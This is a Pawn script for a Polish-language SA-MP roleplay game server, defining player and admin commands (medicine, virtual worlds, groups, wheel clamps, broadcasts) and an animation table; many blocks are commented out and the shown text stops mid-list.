CMD:aplikuj (playerid, params[])
{
	if(GroupCache[pDuty[playerid]][gType] != 2)
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy by móc u¿yæ tej komendy.");
	new targetid;
	if(sscanf(params, "r", targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /aplikuj [ID/Czêœæ nazwy gracza]");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz wyszed³ z gry lub wylogowa³ siê.");
	new Float:X, Float:Y, Float:Z, vw = GetPlayerVirtualWorld(targetid); GetPlayerPos(targetid, X, Y, Z);
	if(GetPlayerVirtualWorld(playerid) != vw || !IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz jest zbyt daleko.");
	if(PlayerCache[targetid][pBW_Time])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz zaaplikowaæ leku gdy gracz ma status BW.");
	if(PlayerCache[targetid][pHealth] >= 10)
	return SendClientMessage(playerid, COLOR_GRAY, "Stan zdrowia tej osoby jest dostateczny, nie potrzebuje leku.");
	new msg[128]; format(msg, sizeof(msg), "aplikuje lek %s.", RPName(targetid)); SendPlayerMe(playerid, msg);
	PlayerCache[targetid][pHealth] += 10;
	SetPlayerHealth(targetid, PlayerCache[targetid][pHealth]);
	format(msg, sizeof(msg), "Zaaplikowano lek przez %s.", RPName(playerid));
	return SendClientMessage(targetid, COLOR_GRAY, msg);
}

/*CMD:bus (playerid, params[])
{
	for(new i; i<MAX_OBJECTS; i++)
	{
		if(ObjectCache[i][oState] == 0)
		{
			if(ObjectCache[i][oModel] == 1257)
			{
				if(IsPlayerInRangeOfPoint(playerid, 200, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]))
				{
					TextDrawForPlayerEx(playerid, 1, "Pozycja przystanku zostala oznakowana na mapie.", 3000);
					DestroyDynamicMapIcon(pMapIcon[playerid]);
					pMapIcon[playerid] = 0;
					pMapIcon[playerid] = CreateDynamicMapIcon(ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ], 12, -1,0,0,0, 6000, 3);
					return Streamer_Update(playerid);
				}
			}
		}
	}
	return ShowDialogInfo(playerid, "Nie znaleziono ¿adnych przystanków autobusowych znajduj¹cych siê w pobli¿u.");
}*/

CMD:vw (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new targetid, vw;
	if(sscanf(params, "ri", targetid, vw))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /vw [ID/Czêœæ nazwy gracza] [Virtual World]");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
	SetPlayerVirtualWorld(targetid, vw);
	new msg[128]; format(msg, sizeof(msg), "Zmieniono VW %s na VW %d.", RPName(targetid), vw);
	return SendClientMessage(playerid, COLOR_GRAY, msg);
}

CMD:gdel (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < 7)
	return 1;
	new guid;
	if(sscanf(params, "i", guid))
	return SendClientMessage(playerid, COLOR_GRAY, "U¿yj: /gdel [UID grupy] by wyjebaæ grupe w powietrze.");
	DestroyGroup(guid);
	return SendClientMessage(playerid, COLOR_GRAY, "Usuniêto grupê.");
}

/*CMD:przetrzymaj (playerid, params[])
{
	if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
	{

	}
	else
	return SendClientMessage(playerid, COLOR_GRAY, "Musisz znajdowaæ siê na s³u¿bie odpowiedniej grupy by móc u¿yæ tej komendy.");
	for(new i; i<MAX_OBJECTS; i++)
	{
		if(ObjectCache[i][oState] == 0)
		{
			if(ObjectCache[i][oVW] == GetPlayerVirtualWorld(playerid))
			{
				if(IsPlayerInRangeOfPoint(playerid, 5.0, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]))
				{
					if(ObjectCache[i][oModel] == 19302 || ObjectCache[i][oModel] == 19303)
					{
						new targetid, time; if(sscanf(params, "ri", targetid, time)) return SendClientMessage(playerid, COLOR_GRAY, "Tip: /przetrzymaj [ID/Czêœæ nazwy gracza] [czas przetrzymania w minutach]");
						if(!pLogged[targetid])
						return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
						new Float:X, Float:Y, Float:Z; GetPlayerPos(targetid, X, Y, Z);
						if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(targetid) || !IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
						return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz jest zbyt daleko.");
						if(time < 0 || time > 120)
						return SendClientMessage(playerid, COLOR_GRAY, "Minimalny czas przetrzymania musi mieœciæ siê pomiêdzy 0-120 minut.");
						PlayerCache[targetid][pJailTime] = time;
						GetPlayerPos(targetid, PlayerCache[targetid][pJailX],  PlayerCache[targetid][pJailY],  PlayerCache[targetid][pJailZ]);
						PlayerCache[targetid][pJailVW] = GetPlayerVirtualWorld(playerid);
						new str[256]; format(str, sizeof(str), "Przetrzymano gracza %s na %d min.\nWróæ tutaj by wypuœciæ gracza po jego odsiadce.", RPName(targetid), time);
						ShowDialogInfo(playerid, str);
						format(str, sizeof(str), "%s nada³ Ci przetrzymanie na %d min.\nNie mo¿esz opuœciæ budynku w którym jesteœ przetrzymywany.", RPName(playerid), time);
						ShowDialogInfo(targetid, str);
						format(str, sizeof(str), "~g~~h~~h~Przetrzymanie: %dmin", time);
						PlayerTextDrawSetString(targetid, AJTextDraw[targetid], str);
						UpdatePlayerName(targetid);
						return PlayerTextDrawShow(targetid, AJTextDraw[targetid]);
					}
				}
			}
		}
	}
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê w pobli¿u celi.");
}*/

stock ReplacePolishSymbols(const str[])
{
	new string[256]; format(string, sizeof(string), "%s", str);
	for(new i=0; i<strlen(string); i++)
	{
		if(string[i] == 'ê')
		{
			string[i] = 'e';
		}
		else if(string[i] == 'ó')
		{
			string[i] = 'o';
		}
		else if(string[i] == '¹')
		{
			string[i] = 'a';
		}
		else if(string[i] == 'œ')
		{
			string[i] = 's';
		}
		else if(string[i] == '³')
		{
			string[i] = 'l';
		}
		else if(string[i] == 'Ÿ')
		{
			string[i] = 'z';
		}
		else if(string[i] == '¿')
		{
			string[i] = 'z';
		}
		else if(string[i] == 'æ')
		{
			string[i] = 'c';
		}
		else if(string[i] == 'ñ')
		{
			string[i] = 'n';
		}
	}
	return string;
}

CMD:blokuj (playerid, params[])
{
	/*if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
	{
		if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GRAY, "Wysi¹dŸ z pojazdu.");
		new vid = GetPlayerCameraTargetVehicle(playerid);
		if(vid != INVALID_VEHICLE_ID)
		{
			new Float:X, Float:Y, Float:Z; GetVehiclePos(vid, X, Y, Z);
			if(IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
			{
				new cost, reason[128];
				if(sscanf(params, "is[128]", cost, reason))
				return SendClientMessage(playerid, COLOR_GRAY, "Tip: /blokuj [koszt] [powód]");
				if(cost < 1 || cost > 3000)
				return SendClientMessage(playerid, COLOR_GRAY, "Koszt blokady musi znajdowaæ siê w przedziale $1-$3000.");
				new vuid = GetVehicleUID(vid);
				if( PlayerCache[playerid][pCurrentVehicle][vBanCost])
				return SendClientMessage(playerid, COLOR_GRAY, "Ten pojazd posiada ju¿ aktywn¹ blokadê na ko³o.");
				 PlayerCache[playerid][pCurrentVehicle][vBanCost] = cost;
				 PlayerCache[playerid][pCurrentVehicle][vBanReason] = reason;
				format(reason, sizeof(reason), "nak³ada blokadê na ko³o pojazdu %s", GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]));
				SendPlayerMe(playerid, reason);
				format(reason, sizeof(reason), "~w~blokada nalozona:~n~~g~~h~$%d", cost);
				GameTextForPlayer(playerid, reason, 3000, 4);
				GetVehiclePos(vid,  PlayerCache[playerid][pCurrentVehicle][vPosX],  PlayerCache[playerid][pCurrentVehicle][vPosY],  PlayerCache[playerid][pCurrentVehicle][vPosZ]);
				return 1;
			}
			else
			{
				return SendClientMessage(playerid, COLOR_GRAY, "Wybrany pojazd jest zbyt daleko.");
			}
		}
		else
		{
			return SendClientMessage(playerid, COLOR_GRAY, "Musisz skierowaæ swoj¹ kamerê na pojazd i stan¹æ przy nim, by go zablokowaæ!");
		}
	}*/
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy by móc u¿yæ tej komendy.");
}

CMD:odblokuj (playerid, params[])
{
/*	if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
	{
		if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GRAY, "Wysi¹dŸ z pojazdu.");
		new vid = GetPlayerCameraTargetVehicle(playerid);
		if(vid != INVALID_VEHICLE_ID)
		{
			new Float:X, Float:Y, Float:Z; GetVehiclePos(vid, X, Y, Z);
			if(IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
			{
				new vuid = GetVehicleUID(vid);
				if( PlayerCache[playerid][pCurrentVehicle][vBanCost] == 0)
				return SendClientMessage(playerid, COLOR_GRAY, "Ten pojazd nie posiada blokady na ko³o.");
				GameTextForPlayer(playerid, "~w~blokada zdjeta", 3000, 4);
				 PlayerCache[playerid][pCurrentVehicle][vBanCost] = 0;
				new reason[128]; reason = "";
				 PlayerCache[playerid][pCurrentVehicle][vBanReason] = reason;
				format(reason, sizeof(reason), "zdejmuje blokadê na ko³o pojazdu %s", GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]));
				return SendPlayerMe(playerid, reason);
			}
			else
			{
				return SendClientMessage(playerid, COLOR_GRAY, "Wybrany pojazd jest zbyt daleko.");
			}
		}
		else
		{
			return SendClientMessage(playerid, COLOR_GRAY, "Musisz skierowaæ swoj¹ kamerê na pojazd i stan¹æ przy nim, by go odblokowaæ!");
		}
	}
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy by móc u¿yæ tej komendy.");*/
}

CMD:tog (playerid, params[])
{
	if(!Isnull(params))
	{
		if(!strcmp(params, "w", true))
		{
			if(pPriv[playerid])
			{
				pPriv[playerid] = false;
				GameTextForPlayer(playerid, "~r~~h~pw wylaczone", 3000, 4);
			}
			else
			{
				pPriv[playerid] = true;
				GameTextForPlayer(playerid, "~g~~h~pw wlaczone", 3000, 4);
			}
			return 1;
		}
	}
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /tog [w]");
}

stock ShowDialogServerSettings(playerid)
{
	new list[525];
	format(list, sizeof(list), ""HEX_GRAY"---\n"HEX_WHITE"1\tPozycja magazynu: %s", GetMagazineStatus());
	return ShowPlayerDialog(playerid, D_SERVER_SETTINGS, DIALOG_STYLE_LIST, "Panel serwerowy", list, "Wybierz", "Zamknij");
}

stock GetMagazineStatus()
{
	new status[64];
	if(ServerSettings[magazinePosX] == 0 && ServerSettings[magazinePosY] == 0 && ServerSettings[magazinePosZ] == 0)
	format(status, sizeof(status), ""HEX_RED"Nieokreœlona");
	else
	format(status, sizeof(status), ""HEX_GREEN"%f : %f : %f", ServerSettings[magazinePosX], ServerSettings[magazinePosY], ServerSettings[magazinePosZ]);
	return status;
}

CMD:server (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < 6)
	return 1;
	return ShowDialogServerSettings(playerid);
}

CMD:paczka (playerid, params[])
{
/*	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == ITEM_STATE_DRIVING)
		{
			if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
			{
				if(pGetPack[playerid] == false)
				{
					if(IsPlayerInRangeOfPoint(playerid, 2.5, ServerSettings[magazinePosX], ServerSettings[magazinePosY], ServerSettings[magazinePosZ]))
					return TextDrawForPlayerEx(playerid, 1, "Odegraj krotkie odebranie paczki z hurtu.", 50000);
				}
				else
				{
					new groupuid = ItemCache[i][iGroupSender];
					new duid = GetGroupDoor(groupuid);
					if(IsPlayerInRangeOfPoint(playerid, 2.5, DoorCache[duid][dOutX], DoorCache[duid][dOutY], DoorCache[duid][dOutZ]))
					return TextDrawForPlayerEx(playerid, 1, "Odegraj dostarczenie paczki na miejsce.~n~~n~Pamietaj, ze glupoty pisane na szybko sa karane!", 5000);
				}
			}
		}
	}
	if(!IsPlayerInAnyVehicle(playerid))
	return ShowDialogInfo(playerid, "Musisz znajdowaæ siê w pojeŸdzie by móc u¿yæ wybraæ paczkê do dostarczenia.");
	if(ServerSettings[magazinePosX] == 0 && ServerSettings[magazinePosY] == 0 && ServerSettings[magazinePosZ] == 0)
	return ShowDialogInfo(playerid, "Pozycja magazynu nie zosta³a jeszcze ustalona przez Administracjê.\nPowiadom kogoœ z ekipy widocznej pod /a!");
	new list[1025], info[64], group_uid;
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == ITEM_STATE_MAGAZINE)
		{
//			group_uid = ItemCache[i][iGroupSender];
		//	format(info, sizeof(info), "%d\tPaczka dla grupy "HEX_BLUE"%s\n", i, GroupCache[group_uid][gName]);
		//	strins(list, info, strlen(list));
		}
	}
	if(Isnull(list))
	return ShowDialogInfo(playerid, "Aktualnie nie ma ¿adnych paczek do dostarczenia.");
	return ShowPlayerDialog(playerid, D_MAGAZINE, DIALOG_STYLE_LIST, "Paczki", list, "Dostarcz", "Anuluj");*/
}

CMD:actortext (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new actorid = GetPlayerCameraTargetDynActor(playerid);
	if(actorid == 0)
	return SendClientMessage(playerid, COLOR_GRAY, "Skieruj sw¹ kamerê na aktora, którego chcesz namierzyæ.");
	new text[256];
	if(sscanf(params, "s[256]", text))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /actortext [tekst]");
	new actoruid = GetActorUID(actorid);
	ActorCache[actoruid][aText] = text;
	ActorCache[actoruid][aType] = 4;
	return SendClientMessage(playerid, COLOR_GRAY, "Gotowe! :-)");
}

CMD:getneardoor (playerid, params[])
{
/*	for(new i; i<LastdUID; i++)
	{
		if(!DoorCache[i][dDestroyed])
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.5, DoorCache[i][dInsX],  DoorCache[i][dInsY],  DoorCache[i][dInsZ]) || IsPlayerInRangeOfPoint(playerid, 2.5, DoorCache[i][dOutX],  DoorCache[i][dOutY],  DoorCache[i][dOutZ]))
			{
				new msg[128]; format(msg, sizeof(msg), "Drzwi UID: %d | Drzwi s¹ przejœciem: %s", i, DoorCache[i][dConnect] ? ("Tak") : ("Nie"));
				return SendClientMessage(playerid, COLOR_GRAY, msg);
			}
		}
	}
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znaleziono drzwi w pobli¿u.");*/
}

CMD:doorowner (playerid, params[])
{
	/*if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new duid, targetid;
	if(sscanf(params, "ir", duid, targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /doorowner [UID drzwi] [ID/Czêœæ nazwy gracza]");
	if(duid < 1 || duid >= MAX_DOORS)
	return SendClientMessage(playerid, COLOR_GRAY, "Wprowadzono nieprawid³ow¹ wartoœæ.");
	DoorCache[duid][dPlayerUID] = targetid;
	DoorCache[duid][dGroupUID] = 0;
	new msg[128]; format(msg, sizeof(msg), "Drzwi(%d) zosta³y podpisane. Nowy w³aœciciel: %s", duid, RPName(targetid));
	return SendClientMessage(playerid, COLOR_GRAY, msg);*/
}

CMD:gvlimit (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < 7)
	return 1;
	new guid, limit;
	if(sscanf(params, "ii", guid, limit))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /gvlimit [guid] [limit pojazdów]");
	if(limit < 1 || limit > 20)
	return SendClientMessage(playerid, COLOR_GRAY, "Mo¿esz ustaliæ limit tylko od 1 do 20 pojazdów.");
	if(guid < 1 || guid >= MAX_GROUPS)
	return SendClientMessage(playerid, COLOR_GRAY, "Nieprawid³owa wartoœæ guid.");
	if(GroupCache[guid][gState] == 1)
	return SendClientMessage(playerid, COLOR_GRAY, "Ta grupa zosta³a usuniêta.");
	GroupCache[guid][gVehicleLimit] = limit;
	new msg[128]; format(msg, sizeof(msg), "Limit pojazdów dla grupy %s (%d) zosta³ zmieniony na: %d pojazdów.", GroupCache[guid][gName], guid, limit);
	return SendClientMessage(playerid, COLOR_GRAY, msg);
}

CMD:cennik (playerid, params[])
{
/*	new duid = GetPlayerDoorUID(playerid);
	if(duid == 0 || DoorCache[duid][dGroupUID] == 0)
	return ShowDialogInfo(playerid, "Musisz znajdowaæ siê w biznesie grupy by skorzystaæ z tej funkcji.");

	new guid = DoorCache[duid][dGroupUID];
	
	if(PlayerCache[playerid][pGroup] == guid || PlayerCache[playerid][pGroup2] == guid || PlayerCache[playerid][pGroup3] == guid)
	{

	}
	else
	{
		return TextDrawForPlayerEx(playerid, 1, "Nie mozesz tego zrobic.", 2500);
	}

	new targetid;
	if(sscanf(params, "r", targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /cennik [ID/Czêœæ nazwy gracza]");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest pod³¹czony do serwera lub wylogowa³ siê.");
	if(!IsPlayerInRangeOfPlayer(playerid, targetid, 5.0))
	return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz jest zbyt daleko.");
	
	new count, list[1025]="#\tNazwa produktu\tCena\tIloœæ\n", info[128];
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == ITEM_STATE_PRODUCT)
		{
			if(ItemCache[i][iOwner] == guid)
			{
				format(info, sizeof(info), "%d\t%s\t$%d\tx%d\n", i, strreplace(ItemCache[i][iName], '_', ' '), ItemCache[i][iCost], ItemCache[i][iVW]); // here VW means count of items group has
				strins(list, info, strlen(list));
				count++;
			}
		}
	}
	if(!count)
	return ShowDialogInfo(playerid, "Brak produktów w magazynie.");
	new msg[64]; format(msg, sizeof(msg), "pokazuje cennik %s", RPName(targetid));
	SendPlayerMe(playerid, msg);
	return ShowPlayerDialog(targetid, D_PRODUCTS, DIALOG_STYLE_TABLIST_HEADERS, "Cennik", list, "Ok", "");*/
}

CMD:podaj (playerid, params[])
{
/*	new duid = GetPlayerDoorUID(playerid);
	if(duid == 0 || DoorCache[duid][dGroupUID] == 0)
	return ShowDialogInfo(playerid, "Nie znajdujesz siê w wewn¹trz budynku grupy.");

	new guid = DoorCache[duid][dGroupUID];
	
	if(PlayerCache[playerid][pGroup] == guid || PlayerCache[playerid][pGroup2] == guid || PlayerCache[playerid][pGroup3] == guid)
	{

	}
	else
	{
		return TextDrawForPlayerEx(playerid, 1, "Nie mozesz tego zrobic.", 2500);
	}

	new targetid, amount;
	if(sscanf(params, "r", targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /podaj [ID/Czêœæ nazwy gracza] [iloœæ]");
	sscanf(params, "ri", targetid, amount);
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracza nie jest na serwerze lub nie zalogowa³ siê.");
	if(!IsPlayerInRangeOfPlayer(playerid, targetid, 5.0))
	return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz jest zbyt daleko.");

	new count, list[1025]="#\tNazwa produktu\tCena\tIloœæ\n", info[128];
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == ITEM_STATE_PRODUCT)
		{
			if(ItemCache[i][iOwner] == guid)
			{
				format(info, sizeof(info), "%d\t%s\t$%d\tx%d\n", i, strreplace(ItemCache[i][iName], '_', ' '), ItemCache[i][iCost], ItemCache[i][iVW]); // here VW is cost too.
				strins(list, info, strlen(list));
				count++;
			}
		}
	}
	if(!count)
	return ShowDialogInfo(playerid, "Brak produktów w magazynie.");
	pVal[playerid] = targetid;
	pVal2[playerid] = amount;
	return ShowPlayerDialog(playerid, D_GROUP_ITEMS, DIALOG_STYLE_TABLIST_HEADERS, "Produkty w magaznie", list, "Wybierz", "Anuluj");*/
}

stock IsPlayerInRangeOfVehicle(playerid, vehicleid, Float:range)
{
	new Float:X, Float:Y, Float:Z;
	GetVehiclePos(vehicleid, X, Y, Z);
	if(IsPlayerInRangeOfPoint(playerid, range, X, Y ,Z))
	return 1;
	return 0;
}

CMD:live (playerid, params[])
{
	/*new guid = pDuty[playerid];
	if(GroupCache[guid][gType] != SAN_NEWS)
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy by móc u¿yæ tej komendy.");

	new duid = GetPlayerDoorUID(playerid);

	new vuid;
	if(duid == 0)
	{
		for(new i; i<=GetVehiclePoolSize(); i++)
		{
			vuid = GetVehicleUID(i);
			if( PlayerCache[playerid][pCurrentVehicle][vModel] == 488 ||  PlayerCache[playerid][pCurrentVehicle][vModel] == 582)
			{
				if(IsPlayerInRangeOfVehicle(playerid, i, 50.0))
				{
					if( PlayerCache[playerid][pCurrentVehicle][vState] == VEHICLE_STATE_GROUP)
					{
						if( PlayerCache[playerid][pCurrentVehicle][vOwner] == guid)
						{
							new text[256];
							if(sscanf(params, "s[256]", text))
							return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /live [wiadomoœæ]");
							new msg[525]; format(msg, sizeof(msg), "~p~%s (live) ~>~ ~w~%s", RPName(playerid), text);
							TextDrawSetString(RadioTextDraw, msg);
							return TextDrawShowForAll(RadioTextDraw);
						}
					}
				}
			}
		}
		return SendClientMessage(playerid, COLOR_GRAY, "By móc nadawaæ na zewn¹trz, musisz byæ min. 50 m od grupowego News Vana lub News Mavericka.");
	}
	else
	{
		if(DoorCache[duid][dGroupUID] == guid)
		{
			new text[256];
			if(sscanf(params, "s[256]", text))
			return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /live [wiadomoœæ]");
			new msg[525]; format(msg, sizeof(msg), "~p~%s (live) ~>~ ~w~%s", RPName(playerid), text);
			TextDrawSetString(RadioTextDraw, msg);
			return TextDrawShowForAll(RadioTextDraw);
		}
		return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê w odpowiednim budynku grupy.");
	}*/
}

CMD:ubranie (playerid, params[])
{
/*	new groupuid = DoorCache[GetPlayerDoorUID(playerid)][dGroupUID];
	if(GroupCache[groupuid][gType] == 12)
	return ShowPlayerDialog(playerid, D_CLOTCHES, DIALOG_STYLE_LIST, "Wybierz opcjê", "1\tUbranie\n2\tAkcesoria", "Wybierz", "Anuluj");
	return 1;*/
}

CMD:asound (playerid, params[])
{
	new soundid;
	if(sscanf(params, "i", soundid))
	return SendClientMessage(playerid, COLOR_GRAY, "/asound [id]");
	return PlayerPlaySound(playerid, soundid, 0, 0, 0);
}

stock AddAnimations()
{
	new name[32], lib[32], bool:repeat=false, customname[32], bool:freeze=true, lockX, lockY, time;

	for(new i=0; i<MAX_ANIMS; i++)
	{
		switch(i)
		{
			case 0:
			{
				name = "Stepsit_loop";
				lib = "Attractors";
				repeat = true;
				customname = "siad2";
			}
			case 1:
			{
				lib = "ped";
				name = "seat_down";
				customname = "krzeslo";
				freeze = true;
				time = 1;
			}
			case 2:
			{
				lib = "shop";
				name = "rob_loop";
				repeat = true;
				customname = "napad";
			}
			case 3:
			{
				lib = "BAR";
				name = "Barserve_bottle";
				customname = "podaj";
			}
			case 4:
			{
				lib = "BASEBALL";
				name = "Bat_M";
				customname = "listwa";
			}
			case 5:
			{
				lib = "COP_AMBIENT";
				name = "Copbrowse_loop";
				customname = "napraw";
				repeat = true;
			}
			case 6:
			{
				lib = "BD_FIRE";
				name = "M_smklean_loop";
				customname = "papieros";
				repeat = true;
			}
			case 7:
			{
				lib = "BEACH";
				name = "bather";
				customname = "lez";
				repeat = true;
			}
			case 8:
			{
				lib = "crack";
				name = "crckdeth2";
				customname = "crack";
				repeat = true;
			}
			case 9:
			{
				lib = "BEACH";
				name = "ParkSit_M_loop";
				customname = "siad";
				repeat = true;
			}
			case 10:
			{
				lib = "DANCING";
				name = "dance_loop";
				customname = "tancz";
				repeat = true;
			}
			case 11:
			{
				lib = "BEACH";
				name = "ParkSit_W_loop";
				customname = "lez2";
				repeat = true;
			}
			case 12:
			{
				lib = "BEACH";
				name = "SitnWait_loop_W";
				customname = "lez3";
				repeat = true;
			}
			case 13:
			{
				lib = "dancing";
				name = "dnce_M_a";
				customname = "tancz2";
				repeat = true;
			}
			case 14:
			{
				lib = "dancing";
				name = "dnce_M_b";
				customname = "tancz3";
				repeat = true;
			}
			case 15:
			{
				lib = "BOMBER";
				name = "BOM_Plant";
				customname = "bomb";
			}
			case 16:
			{
				lib = "dancing";
				name = "dnce_M_c";
				customname = "tancz4";
				repeat = true;
			}
			case 17:
			{
				lib = "BSKTBALL";
				name = "BBALL_def_loop";
				customname = "kosz";
				repeat = true;
			}
			case 18:
			{
				lib = "dancing";
				name = "dnce_M_d";
				customname = "tancz5";
				repeat = true;
			}
			case 19:
			{
				lib = "dancing";
				name = "dnce_M_e";
				customname = "tancz6";
				repeat = true;
			}
			case 20:
			{
				lib = "dealer";
				name = "DEALER_IDLE";
				customname = "dealer";
				repeat = true;
			}
			case 21:
			{
				lib = "ped";
				name = "IDLE_tired";
				customname = "zmeczony";
				repeat = true;
			}
			case 22:
			{
				lib = "FIGHT_B";
				name = "FightB_IDLE";
				customname = "bronsie";
				repeat = true;
			}
			case 23:
			{
				lib = "FOOD";
				name = "EAT_Burger";
				customname = "jedz";
			}
			case 24:
			{
				lib = "GANGS";
				name = "leanIDLE";
				customname = "opieraj";
				repeat = true;
			}
			case 25:
			{
				lib = "GANGS";
				name = "Invite_No";
				customname = "nie";
			}
			case 26:
			{
				lib = "GANGS";
				name = "Invite_Yes";
				customname = "tak";
			}
			case 27:
			{
				lib = "ghands";
				name = "gsign1";
				customname = "stack";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 28:
			{
				lib = "ghands";
				name = "gsign2";
				customname = "stack2";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 29:
			{
				lib = "ghands";
				name = "gsign3";
				customname = "stack3";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 30:
			{
				lib = "ghands";
				name = "gsign4";
				customname = "stack4";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 31:
			{
				lib = "ghands";
				name = "gsign5";
				customname = "stack5";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 32:
			{
				lib = "GRAFFITI";
				name = "spraycan_fire";
				customname = "spray";
				repeat = true;
			}
			case 33:
			{
				lib = "GRAVEYARD";
				name = "mrnF_loop";
				customname = "cry";
				repeat = true;
			}
			case 34:
			{
				lib = "GRAVEYARD";
				name = "prst_loopa";
				customname = "czekam";
				repeat = true;
			}
			case 35:
			{
				lib = "HEIST9";
				name = "Use_SwipeCard";
				customname = "bankomat";
			}
			case 36:
			{
				lib = "INT_HOUSE";
				name = "LOU_Loop";
				customname = "siad3";
				repeat = true;
			}
			case 37:
			{
				lib = "INT_HOUSE";
				name = "wash_up";
				customname = "umyjrece";
			}
			case 38:
			{
				lib = "INT_OFFICE";
				name = "OFF_Sit_Bored_Loop";
				customname = "siad4";
				repeat = true;
			}
			case 39:
			{
				lib = "LOWRIDER";
				name = "F_smklean_loop";
				customname = "papieros2";
				repeat = true;
			}
			case 40:
			{
				lib = "KISSING";
				name = "gfwave2";
				customname = "pa";
			}
			case 41:
			{
				lib = "MEDIC";
				name = "CPR";
				customname = "medyk";
			}
			case 42:
			{
				lib = "MISC";
				name = "Hiker_Pose";
				customname = "taxi";
				freeze = true;
			}
			case 43:
			{
				lib = "ON_LOOKERS";
				name = "wave_loop";
				customname = "machaj";
				repeat = true;
			}
			case 44:
			{
				lib = "PARK";
				name = "Tai_Chi_Loop";
				customname = "taichi";
				repeat = true;
			}
			case 45:
			{
				lib = "PAULNMAC";
				name = "wank_loop";
				customname = "walkonia";
				repeat = true;
			}
			case 46:
			{
				lib = "ped";
				name = "ARRESTgun";
				customname = "celuj";
				freeze = true;
			}
			case 47:
			{
				lib = "ped";
				name = "car_hookertalk";
				customname = "odwazny";
				repeat = true;
			}
			case 48:
			{
				lib = "ped";
				name = "cower";
				customname = "chowaj";
				repeat = true;
			}
			case 49:
			{
				lib = "ped";
				name = "FLOOR_hit";
				customname = "padnij2";
				freeze = true;
			}
			case 50:
			{
				lib = "ped";
				name = "FLOOR_hit_f";
				customname = "padnij";
				freeze = true;
			}
			case 51:
			{
				lib = "ped";
				name = "fucku";
				customname = "fuck";
			}
			case 52:
			{
				lib = "ped";
				name = "gum_eat";
				customname = "jedzgume";
			}
			case 53:
			{
				lib = "ped";
				name = "handsup";
				customname = "rece";
				freeze = true;
			}
			case 54:
			{
				lib = "gangs";
				name = "prtial_gngtlkA";
				customname = "talk2";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 55:
			{
				lib = "ped";
				name = "IDLE_chat";
				customname = "talk";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 56:
			{
				lib = "gangs";
				name = "prtial_gngtlkB";
				customname = "talk3";
				time = 1;
				repeat = true;
				freeze = true;
			}
			case 57:
			{
				lib = "ped";
				name = "IDLE_taxi";
				customname = "taxi2";
			}
			case 58:
			{
				lib = "ped";
				name = "XPRESSscratch";
				customname = "rozgladaj";
			}
			case 59:
			{
